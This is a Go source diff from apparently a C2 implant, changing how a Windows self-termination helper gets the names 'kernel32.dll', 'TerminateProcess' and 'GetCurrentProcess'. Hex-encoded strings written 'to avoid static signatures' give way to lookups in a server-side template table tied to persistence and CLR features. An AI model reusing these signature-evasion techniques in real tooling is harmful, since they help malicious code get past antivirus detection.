@@ -9,21 +9,24 @@ import (
 	"syscall"
 )
 
-// Exit helper strings (constructed to avoid static signatures)
-var (
-	// DLL names
-	ehDllKernel32 = string([]byte{0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c}) // kernel32.dll
-
-	// Proc names
-	ehProcGetCurrentProcess = string([]byte{0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73}) // GetCurrentProcess
-	ehProcTerminateProcess  = string([]byte{0x54, 0x65, 0x72, 0x6d, 0x69, 0x6e, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73})       // TerminateProcess
+// Exit helper template indices - reuse CLR template indices from clr_exit_prevention.go
+// These must match server-side templates/persistence.go
+const (
+	idxExitDllKernel32         = 102 // kernel32.dll (same as idxClrDllKernel32)
+	idxExitProcTerminateProcess = 109 // TerminateProcess (same as idxClrApiTerminateProcess)
+	idxExitProcGetCurrentProcess = 110 // GetCurrentProcess (same as idxClrApiGetCurrentProc)
 )
+
+// Exit helper string accessors using CLR template lookups
+func ehDllKernel32() string         { return getClrTpl(idxExitDllKernel32) }
+func ehProcGetCurrentProcess() string { return getClrTpl(idxExitProcGetCurrentProcess) }
+func ehProcTerminateProcess() string  { return getClrTpl(idxExitProcTerminateProcess) }
 
 // forceTerminateWindows forcefully terminates the process on Windows
 func forceTerminateWindows() {
-	kernel32 := syscall.NewLazyDLL(ehDllKernel32)
-	getCurrentProcess := kernel32.NewProc(ehProcGetCurrentProcess)
-	terminateProcess := kernel32.NewProc(ehProcTerminateProcess)
+	kernel32 := syscall.NewLazyDLL(ehDllKernel32())
+	getCurrentProcess := kernel32.NewProc(ehProcGetCurrentProcess())
+	terminateProcess := kernel32.NewProc(ehProcTerminateProcess())
 
 	handle, _, _ := getCurrentProcess.Call()
 	terminateProcess.Call(handle, 0)
